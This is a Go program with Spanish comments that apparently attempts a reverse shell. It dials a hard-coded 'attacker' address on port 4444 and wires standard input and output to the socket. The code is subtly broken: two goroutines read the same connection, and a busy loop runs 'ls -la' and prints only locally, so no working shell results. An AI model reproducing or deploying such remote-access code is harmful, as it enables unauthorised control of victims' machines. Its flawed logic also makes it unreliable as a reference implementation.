package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

func main() {
    // Dirección IP del atacante y puerto
    c, err := net.Dial("tcp", "192.168.0.14:4444")
    if err != nil {
        panic(err)
    }

    // Copiar la entrada estándar del cliente al proceso remoto
    go func() {
        _, err := io.Copy(c, os.Stdin)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Copiar la salida estándar del proceso remoto al cliente
    go func() {
        _, err := io.Copy(os.Stdout, c)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Copiar la salida de error del proceso remoto al cliente
    go func() {
        _, err := io.Copy(os.Stderr, c)
        if err != nil {
            fmt.Println(err)
        }
    }()


    // Mantener la conexión abierta
    for {
		cmd := exec.Command("ls", "-la")
        output, err := cmd.Output()
        if err != nil {
            fmt.Println(err)
        }
        fmt.Println(string(output))
		
    }
}